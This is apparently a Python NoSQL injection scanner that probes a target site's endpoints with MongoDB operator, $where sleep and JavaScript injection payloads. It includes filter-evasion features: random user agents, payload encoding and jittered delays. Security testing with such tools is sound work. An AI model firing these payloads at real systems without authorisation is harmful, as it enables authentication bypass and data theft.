#!/usr/bin/env python3
"""
NoSQL Injection Detector
A comprehensive tool for detecting NoSQL injection vulnerabilities
Made by: https://github.com/skypoc
License: MIT
"""

import asyncio
import aiohttp
import argparse
import json
import time
import hashlib
import logging
import sys
from typing import Dict, List, Optional, Tuple, Any
from datetime import datetime
from urllib.parse import urlparse, urljoin
import yaml
import re
from dataclasses import dataclass
from enum import Enum
import warnings

# Suppress SSL warnings for testing environments
warnings.filterwarnings('ignore')

class InjectionType(Enum):
    """Types of NoSQL injection attacks"""
    AUTHENTICATION_BYPASS = "auth_bypass"
    DATA_EXTRACTION = "data_extraction"
    BOOLEAN_BASED = "boolean_based"
    TIME_BASED = "time_based"
    ERROR_BASED = "error_based"
    JAVASCRIPT = "javascript"

@dataclass
class DetectionResult:
    """Result of a detection attempt"""
    vulnerable: bool
    injection_type: InjectionType
    confidence: float
    payload: Dict[str, Any]
    evidence: str
    endpoint: str
    parameter: str
    method: str
    response_time: float

class NoSQLDetector:
    """Main NoSQL injection detection engine"""
    
    def __init__(self, config_path: Optional[str] = None):
        self.config = self._load_config(config_path)
        self.session: Optional[aiohttp.ClientSession] = None
        self.results: List[DetectionResult] = []
        self.logger = self._setup_logging()
        self.request_count = 0
        self.start_time = None
        
    def _load_config(self, config_path: Optional[str]) -> Dict[str, Any]:
        """Load configuration from file or use defaults"""
        default_config = {
            "timeout": 30,
            "max_concurrent_requests": 10,
            "delay_between_requests": 0.5,
            "user_agent": "NoSQL-Detector/1.0 (Security Scanner)",
            "follow_redirects": False,
            "verify_ssl": False,
            "detection_methods": {
                "boolean_based": True,
                "time_based": True,
                "error_based": True,
                "javascript": True
            },
            "evasion_techniques": {
                "randomize_user_agent": True,
                "add_delay_variance": True,
                "use_encoding": True
            },
            "payloads": {
                "basic": True,
                "advanced": True,
                "custom": []
            }
        }
        
        if config_path:
            try:
                with open(config_path, 'r') as f:
                    user_config = yaml.safe_load(f)
                    default_config.update(user_config)
            except Exception as e:
                print(f"Warning: Could not load config file: {e}")
                
        return default_config
    
    def _setup_logging(self) -> logging.Logger:
        """Configure logging"""
        logger = logging.getLogger('NoSQLDetector')
        logger.setLevel(logging.INFO)
        
        # Console handler
        console_handler = logging.StreamHandler(sys.stdout)
        console_handler.setLevel(logging.INFO)
        
        # File handler
        file_handler = logging.FileHandler(
            f'nosql_detection_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'
        )
        file_handler.setLevel(logging.DEBUG)
        
        # Formatter
        formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        console_handler.setFormatter(formatter)
        file_handler.setFormatter(formatter)
        
        logger.addHandler(console_handler)
        logger.addHandler(file_handler)
        
        return logger
    
    async def detect(self, target: str, endpoints: Optional[List[str]] = None):
        """Main detection entry point"""
        self.start_time = time.time()
        self.logger.info(f"Starting NoSQL injection detection on {target}")
        
        # Create session with custom settings
        timeout = aiohttp.ClientTimeout(total=self.config['timeout'])
        connector = aiohttp.TCPConnector(
            verify_ssl=self.config['verify_ssl'],
            limit=self.config['max_concurrent_requests']
        )
        
        async with aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
            headers={'User-Agent': self._get_user_agent()}
        ) as self.session:
            # Discover endpoints if not provided
            if not endpoints:
                endpoints = await self._discover_endpoints(target)
                
            # Test each endpoint
            tasks = []
            for endpoint in endpoints:
                task = self._test_endpoint(target, endpoint)
                tasks.append(task)
                
            await asyncio.gather(*tasks, return_exceptions=True)
            
        # Generate report
        return self._generate_report()
    
    async def _discover_endpoints(self, target: str) -> List[str]:
        """Discover potential injection points"""
        self.logger.info("Discovering endpoints...")
        
        common_endpoints = [
            '/api/login', '/api/auth', '/api/search', '/api/query',
            '/login', '/auth', '/search', '/user', '/users',
            '/api/v1/auth', '/api/v1/search', '/api/v1/users',
            '/graphql', '/api/graphql'
        ]
        
        discovered = []
        for endpoint in common_endpoints:
            url = urljoin(target, endpoint)
            if await self._endpoint_exists(url):
                discovered.append(url)
                self.logger.info(f"Found endpoint: {url}")
                
        return discovered
    
    async def _endpoint_exists(self, url: str) -> bool:
        """Check if an endpoint exists"""
        try:
            async with self.session.get(url) as response:
                # Consider various success indicators
                return response.status in [200, 201, 204, 301, 302, 401, 403]
        except:
            return False
    
    async def _test_endpoint(self, target: str, endpoint: str):
        """Test a specific endpoint for NoSQL injection"""
        self.logger.info(f"Testing endpoint: {endpoint}")
        
        # Get baseline response
        baseline = await self._get_baseline(endpoint)
        if not baseline:
            return
            
        # Identify parameters
        params = await self._identify_parameters(endpoint, baseline)
        
        # Test each parameter with different methods
        for param in params:
            if self.config['detection_methods']['boolean_based']:
                await self._test_boolean_injection(endpoint, param, baseline)
                
            if self.config['detection_methods']['time_based']:
                await self._test_time_based_injection(endpoint, param, baseline)
                
            if self.config['detection_methods']['error_based']:
                await self._test_error_based_injection(endpoint, param, baseline)
                
            if self.config['detection_methods']['javascript']:
                await self._test_javascript_injection(endpoint, param, baseline)
                
            # Add delay to avoid rate limiting
            await self._smart_delay()
    
    async def _get_baseline(self, endpoint: str) -> Optional[Dict[str, Any]]:
        """Get baseline response for comparison"""
        try:
            # Try different methods
            for method in ['GET', 'POST']:
                test_data = self._get_test_data(method)
                
                start_time = time.time()
                if method == 'GET':
                    async with self.session.get(endpoint, params=test_data) as response:
                        content = await response.text()
                        response_time = time.time() - start_time
                else:
                    async with self.session.post(endpoint, json=test_data) as response:
                        content = await response.text()
                        response_time = time.time() - start_time
                        
                if response.status < 500:  # Not a server error
                    return {
                        'method': method,
                        'status': response.status,
                        'content': content,
                        'length': len(content),
                        'response_time': response_time,
                        'headers': dict(response.headers)
                    }
        except Exception as e:
            self.logger.error(f"Error getting baseline for {endpoint}: {e}")
            
        return None
    
    def _get_test_data(self, method: str) -> Dict[str, str]:
        """Get test data for baseline request"""
        if method == 'GET':
            return {'q': 'test', 'search': 'test', 'id': '1'}
        else:
            return {
                'username': 'testuser',
                'password': 'testpass',
                'email': 'test@test.com',
                'q': 'test',
                'id': '1'
            }
    
    async def _identify_parameters(self, endpoint: str, baseline: Dict[str, Any]) -> List[str]:
        """Identify injectable parameters"""
        params = []
        
        # Common parameter names
        common_params = [
            'username', 'password', 'email', 'user', 'pass', 'login',
            'q', 'query', 'search', 'filter', 'where', 'find',
            'id', 'uid', 'userid', 'trackingNum', 'token', 'auth'
        ]
        
        # Test each parameter
        for param in common_params:
            if await self._param_exists(endpoint, param, baseline):
                params.append(param)
                self.logger.debug(f"Found parameter: {param}")
                
        return params
    
    async def _param_exists(self, endpoint: str, param: str, baseline: Dict[str, Any]) -> bool:
        """Check if a parameter exists and affects the response"""
        try:
            test_value = 'test_' + hashlib.md5(param.encode()).hexdigest()[:8]
            
            if baseline['method'] == 'GET':
                async with self.session.get(
                    endpoint, 
                    params={param: test_value}
                ) as response:
                    content = await response.text()
            else:
                async with self.session.post(
                    endpoint,
                    json={param: test_value}
                ) as response:
                    content = await response.text()
                    
            # Check if response differs from baseline
            return len(content) != baseline['length'] or response.status != baseline['status']
            
        except:
            return False
    
    async def _test_boolean_injection(self, endpoint: str, param: str, baseline: Dict[str, Any]):
        """Test for boolean-based injection"""
        self.logger.debug(f"Testing boolean injection on {param}")
        
        payloads = self._get_boolean_payloads()
        
        for payload in payloads:
            result = await self._send_payload(endpoint, param, payload, baseline)
            
            if self._detect_boolean_difference(baseline, result):
                detection = DetectionResult(
                    vulnerable=True,
                    injection_type=InjectionType.BOOLEAN_BASED,
                    confidence=self._calculate_confidence(baseline, result),
                    payload={param: payload},
                    evidence=f"Response differs from baseline. Length: {result.get('length', 0)} vs {baseline['length']}",
                    endpoint=endpoint,
                    parameter=param,
                    method=baseline['method'],
                    response_time=result.get('response_time', 0)
                )
                self.results.append(detection)
                self.logger.warning(f"Potential boolean injection found: {detection}")
    
    async def _test_time_based_injection(self, endpoint: str, param: str, baseline: Dict[str, Any]):
        """Test for time-based injection"""
        self.logger.debug(f"Testing time-based injection on {param}")
        
        payloads = self._get_time_based_payloads()
        
        for payload in payloads:
            # Test multiple times for accuracy
            delays = []
            for _ in range(3):
                result = await self._send_payload(endpoint, param, payload, baseline)
                if result and 'response_time' in result:
                    delays.append(result['response_time'])
                    
            if delays and min(delays) > baseline['response_time'] + 2:
                detection = DetectionResult(
                    vulnerable=True,
                    injection_type=InjectionType.TIME_BASED,
                    confidence=0.8 if min(delays) > baseline['response_time'] + 4 else 0.6,
                    payload={param: payload},
                    evidence=f"Significant delay detected. Average: {sum(delays)/len(delays):.2f}s vs baseline: {baseline['response_time']:.2f}s",
                    endpoint=endpoint,
                    parameter=param,
                    method=baseline['method'],
                    response_time=sum(delays)/len(delays)
                )
                self.results.append(detection)
                self.logger.warning(f"Potential time-based injection found: {detection}")
    
    async def _test_error_based_injection(self, endpoint: str, param: str, baseline: Dict[str, Any]):
        """Test for error-based injection"""
        self.logger.debug(f"Testing error-based injection on {param}")
        
        payloads = self._get_error_payloads()
        
        for payload in payloads:
            result = await self._send_payload(endpoint, param, payload, baseline)
            
            if self._detect_error_patterns(result):
                detection = DetectionResult(
                    vulnerable=True,
                    injection_type=InjectionType.ERROR_BASED,
                    confidence=0.9,
                    payload={param: payload},
                    evidence=f"Error pattern detected in response",
                    endpoint=endpoint,
                    parameter=param,
                    method=baseline['method'],
                    response_time=result.get('response_time', 0)
                )
                self.results.append(detection)
                self.logger.warning(f"Potential error-based injection found: {detection}")
    
    async def _test_javascript_injection(self, endpoint: str, param: str, baseline: Dict[str, Any]):
        """Test for JavaScript injection ($where)"""
        self.logger.debug(f"Testing JavaScript injection on {param}")
        
        payloads = self._get_javascript_payloads()
        
        for payload in payloads:
            result = await self._send_payload(endpoint, param, payload, baseline)
            
            # Check for successful JS execution indicators
            if result:
                # Time-based JS payloads
                if '$where' in str(payload) and 'sleep' in str(payload):
                    if result.get('response_time', 0) > baseline['response_time'] + 2:
                        detection = DetectionResult(
                            vulnerable=True,
                            injection_type=InjectionType.JAVASCRIPT,
                            confidence=0.9,
                            payload={param: payload},
                            evidence=f"JavaScript sleep executed. Delay: {result['response_time']:.2f}s",
                            endpoint=endpoint,
                            parameter=param,
                            method=baseline['method'],
                            response_time=result['response_time']
                        )
                        self.results.append(detection)
                        self.logger.warning(f"JavaScript injection found: {detection}")
                        
                # Boolean-based JS payloads
                elif self._detect_boolean_difference(baseline, result):
                    detection = DetectionResult(
                        vulnerable=True,
                        injection_type=InjectionType.JAVASCRIPT,
                        confidence=0.8,
                        payload={param: payload},
                        evidence="JavaScript condition altered response",
                        endpoint=endpoint,
                        parameter=param,
                        method=baseline['method'],
                        response_time=result.get('response_time', 0)
                    )
                    self.results.append(detection)
                    self.logger.warning(f"JavaScript injection found: {detection}")
    
    async def _send_payload(self, endpoint: str, param: str, payload: Any, 
                           baseline: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Send a payload and return the response"""
        try:
            self.request_count += 1
            
            # Apply evasion techniques
            if self.config['evasion_techniques']['use_encoding']:
                payload = self._encode_payload(payload)
                
            headers = {'User-Agent': self._get_user_agent()}
            
            start_time = time.time()
            
            if baseline['method'] == 'GET':
                async with self.session.get(
                    endpoint,
                    params={param: payload},
                    headers=headers
                ) as response:
                    content = await response.text()
                    response_time = time.time() - start_time
            else:
                # For POST, check if we need JSON or form data
                if 'json' in baseline.get('headers', {}).get('content-type', '').lower():
                    data = json.dumps({param: payload})
                    headers['Content-Type'] = 'application/json'
                else:
                    data = {param: payload}
                    
                async with self.session.post(
                    endpoint,
                    json={param: payload} if isinstance(data, dict) else None,
                    data=data if isinstance(data, str) else None,
                    headers=headers
                ) as response:
                    content = await response.text()
                    response_time = time.time() - start_time
                    
            return {
                'status': response.status,
                'content': content,
                'length': len(content),
                'response_time': response_time,
                'headers': dict(response.headers)
            }
            
        except asyncio.TimeoutError:
            # Timeout might indicate successful time-based injection
            return {
                'status': 0,
                'content': '',
                'length': 0,
                'response_time': self.config['timeout'],
                'timeout': True
            }
        except Exception as e:
            self.logger.debug(f"Error sending payload: {e}")
            return None
    
    def _get_boolean_payloads(self) -> List[Any]:
        """Get boolean-based injection payloads"""
        payloads = []
        
        if self.config['payloads']['basic']:
            payloads.extend([
                {"$ne": None},
                {"$ne": ""},
                {"$ne": "nonexistent"},
                {"$gt": ""},
                {"$gte": ""},
                {"$exists": True},
                {"$regex": ".*"},
                {"$regex": "^.*$"},
                {"$in": []},
                {"$nin": ["impossible"]}
            ])
            
        if self.config['payloads']['advanced']:
            payloads.extend([
                {"$or": [{"$ne": "a"}, {"$ne": "b"}]},
                {"$and": [{"$gt": ""}, {"$lt": "~"}]},
                {"$not": {"$eq": "impossible"}},
                {"$where": "1==1"},
                {"$expr": {"$eq": [1, 1]}},
                {"$comment": "injection_test"}
            ])
            
        # Add custom payloads
        payloads.extend(self.config['payloads'].get('custom', []))
        
        return payloads
    
    def _get_time_based_payloads(self) -> List[Any]:
        """Get time-based injection payloads"""
        return [
            {"$where": "sleep(3000)"},
            {"$where": "var d = new Date(); while((new Date())-d<3000){}"},
            {"$where": "function(){var d = new Date(); while((new Date())-d<3000){} return true;}()"},
            {"$function": {"body": "function(){sleep(3000)}", "args": [], "lang": "js"}}
        ]
    
    def _get_error_payloads(self) -> List[Any]:
        """Get error-triggering payloads"""
        return [
            {"$invalidOp": 1},
            {"$where": "invalid javascript"},
            {"$regex": "["},  # Invalid regex
            {"$expr": {"$divide": [1, 0]}},  # Division by zero
            {"$type": "invalid_type"},
            {"$jsonSchema": {"invalid": "schema"}}
        ]
    
    def _get_javascript_payloads(self) -> List[Any]:
        """Get JavaScript injection payloads"""
        return [
            {"$where": "true"},
            {"$where": "1==1"},
            {"$where": "this.constructor.constructor('return true')()"},
            {"$where": "sleep(3000) || true"},
            {"$where": "';return true;//"},
            '" || 1==1 || "',
            '"; return true; //',
            "admin' || 'a'=='a"
        ]
    
    def _detect_boolean_difference(self, baseline: Dict[str, Any], 
                                  result: Optional[Dict[str, Any]]) -> bool:
        """Detect differences indicating successful boolean injection"""
        if not result:
            return False
            
        # Significant length difference
        if abs(result['length'] - baseline['length']) > 100:
            return True
            
        # Status code change (but not to 5xx)
        if result['status'] != baseline['status'] and result['status'] < 500:
            return True
            
        # Check for success indicators in content
        success_patterns = [
            'welcome', 'dashboard', 'success', 'logged in',
            'authenticated', '"admin"', '"role"'
        ]
        
        content_lower = result['content'].lower()
        baseline_lower = baseline['content'].lower()
        
        for pattern in success_patterns:
            if pattern in content_lower and pattern not in baseline_lower:
                return True
                
        return False
    
    def _detect_error_patterns(self, result: Optional[Dict[str, Any]]) -> bool:
        """Detect error patterns in response"""
        if not result or not result.get('content'):
            return False
            
        error_patterns = [
            r'mongodb\s+error',
            r'mongoose.*cast',
            r'objectid\s+failed',
            r'bson',
            r'\$where',
            r'syntaxerror',
            r'cannot\s+convert',
            r'invalid\s+operator',
            r'unknown\s+operator:\s*\$',
            r'query\s+selector\s+must',
            r'bad\s+value\s+for\s+operator'
        ]
        
        content_lower = result['content'].lower()
        
        for pattern in error_patterns:
            if re.search(pattern, content_lower, re.IGNORECASE):
                return True
                
        return False
    
    def _calculate_confidence(self, baseline: Dict[str, Any], 
                            result: Dict[str, Any]) -> float:
        """Calculate confidence score for detection"""
        confidence = 0.5
        
        # Length difference factor
        length_diff = abs(result['length'] - baseline['length'])
        if length_diff > 500:
            confidence += 0.3
        elif length_diff > 100:
            confidence += 0.2
            
        # Status code factor
        if result['status'] != baseline['status']:
            confidence += 0.2
            
        # Time factor for time-based
        if result['response_time'] > baseline['response_time'] + 3:
            confidence = max(confidence, 0.8)
            
        return min(confidence, 1.0)
    
    def _encode_payload(self, payload: Any) -> Any:
        """Apply encoding to evade basic filters"""
        if isinstance(payload, str):
            # Try different encodings
            import random
            encoding_methods = [
                lambda x: x,  # No encoding
                lambda x: x.replace('$', '\u0024'),  # Unicode
                lambda x: x.replace('$', '%24'),  # URL encoding
            ]
            return random.choice(encoding_methods)(payload)
        return payload
    
    def _get_user_agent(self) -> str:
        """Get user agent with optional randomization"""
        if self.config['evasion_techniques']['randomize_user_agent']:
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
            ]
            import random
            return random.choice(user_agents)
        return self.config['user_agent']
    
    async def _smart_delay(self):
        """Add delay between requests with variance"""
        delay = self.config['delay_between_requests']
        
        if self.config['evasion_techniques']['add_delay_variance']:
            import random
            delay += random.uniform(-0.3, 0.3)
            delay = max(0.1, delay)  # Minimum 100ms
            
        await asyncio.sleep(delay)
    
    def _generate_report(self) -> Dict[str, Any]:
        """Generate detection report"""
        elapsed_time = time.time() - self.start_time
        
        # Group results by endpoint and type
        vulnerabilities_by_endpoint = {}
        for result in self.results:
            if result.endpoint not in vulnerabilities_by_endpoint:
                vulnerabilities_by_endpoint[result.endpoint] = []
            vulnerabilities_by_endpoint[result.endpoint].append(result)
            
        # Calculate statistics
        total_vulnerabilities = len(self.results)
        high_confidence = len([r for r in self.results if r.confidence >= 0.8])
        
        report = {
            'scan_info': {
                'start_time': datetime.fromtimestamp(self.start_time).isoformat(),
                'duration': f"{elapsed_time:.2f} seconds",
                'total_requests': self.request_count,
                'requests_per_second': self.request_count / elapsed_time if elapsed_time > 0 else 0
            },
            'summary': {
                'total_vulnerabilities': total_vulnerabilities,
                'high_confidence_vulnerabilities': high_confidence,
                'vulnerable_endpoints': len(vulnerabilities_by_endpoint),
                'injection_types_found': list(set(r.injection_type.value for r in self.results))
            },
            'vulnerabilities': [
                {
                    'endpoint': r.endpoint,
                    'parameter': r.parameter,
                    'type': r.injection_type.value,
                    'confidence': r.confidence,
                    'payload': r.payload,
                    'evidence': r.evidence,
                    'method': r.method,
                    'response_time': r.response_time
                }
                for r in self.results
            ],
            'recommendations': self._generate_recommendations()
        }
        
        # Save report
        report_filename = f'nosql_detection_report_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        with open(report_filename, 'w') as f:
            json.dump(report, f, indent=2)
            
        self.logger.info(f"Report saved to {report_filename}")
        
        return report
    
    def _generate_recommendations(self) -> List[str]:
        """Generate security recommendations"""
        recommendations = [
            "Validate and sanitize all user inputs before using in database queries",
            "Use parameterized queries or prepared statements where possible",
            "Implement strict type checking for all input parameters",
            "Avoid using dangerous operators like $where in production",
            "Apply the principle of least privilege to database users",
            "Enable query logging and monitoring for suspicious patterns",
            "Regularly update database software and drivers",
            "Implement rate limiting to prevent automated attacks"
        ]
        
        # Add specific recommendations based on findings
        if any(r.injection_type == InjectionType.JAVASCRIPT for r in self.results):
            recommendations.insert(0, "CRITICAL: Disable JavaScript execution in MongoDB queries ($where)")
            
        if any(r.injection_type == InjectionType.AUTHENTICATION_BYPASS for r in self.results):
            recommendations.insert(0, "CRITICAL: Fix authentication bypass vulnerabilities immediately")
            
        return recommendations


async def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description='NoSQL Injection Detector - Comprehensive security scanner',
        epilog='Made by https://github.com/skypoc'
    )
    
    parser.add_argument('target', help='Target URL to scan')
    parser.add_argument('-c', '--config', help='Configuration file path')
    parser.add_argument('-e', '--endpoints', nargs='+', help='Specific endpoints to test')
    parser.add_argument('-o', '--output', help='Output file for results')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--timeout', type=int, help='Request timeout in seconds')
    parser.add_argument('--threads', type=int, help='Maximum concurrent requests')
    
    args = parser.parse_args()
    
    # Create detector instance
    detector = NoSQLDetector(args.config)
    
    # Override config with command line arguments
    if args.timeout:
        detector.config['timeout'] = args.timeout
    if args.threads:
        detector.config['max_concurrent_requests'] = args.threads
    if args.verbose:
        detector.logger.setLevel(logging.DEBUG)
    
    # Run detection
    try:
        report = await detector.detect(args.target, args.endpoints)
        
        # Display summary
        print("\n" + "="*60)
        print("NoSQL INJECTION DETECTION SUMMARY")
        print("="*60)
        print(f"Target: {args.target}")
        print(f"Duration: {report['scan_info']['duration']}")
        print(f"Total Requests: {report['scan_info']['total_requests']}")
        print(f"Vulnerabilities Found: {report['summary']['total_vulnerabilities']}")
        print(f"High Confidence: {report['summary']['high_confidence_vulnerabilities']}")
        print(f"Vulnerable Endpoints: {report['summary']['vulnerable_endpoints']}")
        print(f"Injection Types: {', '.join(report['summary']['injection_types_found'])}")
        print("="*60)
        
        if report['summary']['total_vulnerabilities'] > 0:
            print("\nVULNERABILITIES DETECTED:")
            for vuln in report['vulnerabilities'][:5]:  # Show first 5
                print(f"\n[{vuln['type'].upper()}] {vuln['endpoint']}")
                print(f"  Parameter: {vuln['parameter']}")
                print(f"  Confidence: {vuln['confidence']*100:.0f}%")
                print(f"  Evidence: {vuln['evidence']}")
                
            if len(report['vulnerabilities']) > 5:
                print(f"\n... and {len(report['vulnerabilities'])-5} more vulnerabilities")
                
        print(f"\nFull report saved to: nosql_detection_report_*.json")
        
        # Save custom output if requested
        if args.output:
            with open(args.output, 'w') as f:
                json.dump(report, f, indent=2)
            print(f"Results also saved to: {args.output}")
            
    except KeyboardInterrupt:
        print("\n\nScan interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\nError during scan: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    asyncio.run(main())
